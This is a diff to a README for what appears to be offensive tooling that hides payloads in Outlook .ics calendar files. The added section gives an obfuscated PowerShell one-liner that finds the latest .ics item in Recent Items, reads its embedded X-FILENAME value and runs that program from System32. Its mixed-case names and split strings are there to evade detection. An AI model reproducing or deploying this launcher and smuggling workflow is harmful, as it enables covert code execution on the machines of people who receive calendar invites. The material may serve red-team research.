@@ -41,6 +41,14 @@ python .\embed_outlook_ics2.py --summary "Time to pop calc" --file .\Payloads\ca
 python ..\extract_outlook_ics2.py --ics '.\Received\calc.ics' --out-dir .\Exploded\. --overwrite
 ```
 
+### PowerShell Launcher Concept
+This one-liner demonstrates a launcher workflow that uses a recent Outlook `.ics` artifact as a filename pointer. It searches the Windows Recent Items folder for the latest `.ics` target, reads the embedded `X-FILENAME` value, sanitizes it, resolves the name under `%WINDIR%\System32`, and attempts to execute it.
+
+```PowerShell Search & Explode
+& (JOIn-path $Env:wInDIR\SYstEm32 ((SELecT-STriNG -PatH ((gET-CHILdiTem ((New-oBJeCt -COmobJeCt shell.apPlIcatIon).NameSpace(('sh'+'e'+'ll:Re'+'ce'+'n'+'t')).SelF.PaTh) -Filter *.LNK -recurse|SORt-OBjeCT LAstWrITetiME -desCEnDinG|foreacH-oBjEct{(NEW-oBJeCT -COmObJECT wsCrIPt.shell).CreateShORtcUt($_.FULlnaME).TARGetPATh}|WhERe-ObjecT{$_-like'*.ics'}|sELeCt-OBJECT -firSt 1)) -paTtErN ('X'+'-F'+'IL'+'ENAM'+'E'+'=')).LINe -replace ('.'+'*X-FILEN'+'AME'+'=([^'+';]'+'+'+').'+'*'),'$1' -replace (-join('[','^\','w\','.\','-',']')),''))
+```
+
+
 Run either script with `-h` to see additional options for compression, chunk size, timestamps, and custom property prefixes.
 
 ## Files
